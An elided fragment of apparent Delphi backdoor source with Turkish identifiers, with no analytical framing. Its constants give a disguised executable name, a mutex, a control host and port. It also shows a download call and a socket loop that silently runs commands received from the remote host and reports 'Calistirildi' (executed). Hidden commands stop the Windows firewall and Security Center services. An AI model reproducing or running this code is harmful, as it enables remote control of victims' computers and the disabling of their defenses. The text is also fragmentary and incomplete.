...
CONST
//************************************************
Tashakli_isim = 'wdfmrg.exe';
anahtaradi = 'DslMon32';
MuteXxX = 'FreeDooMorFire';
adres = 'judith';
port = 2015;
//************************************************
...
inndir(nil, PChar(indirilesi), PChar(kaydedilesi), 0, nil) ;
...
begin
  ...
  While Socket.Connected do begin
    ...
    ShellExecute(0,'open',PChar(komut),nil,nil,0);
    Socket.Sendstring('Calistirildi ;)');
    end;
...
begin
  ...
  Winexec(pchar('net.exe stop sharedaccess'), SW_HIDE);
  Winexec(pchar('net.exe stop wscsvc'), SW_HIDE);
  sleep(200);
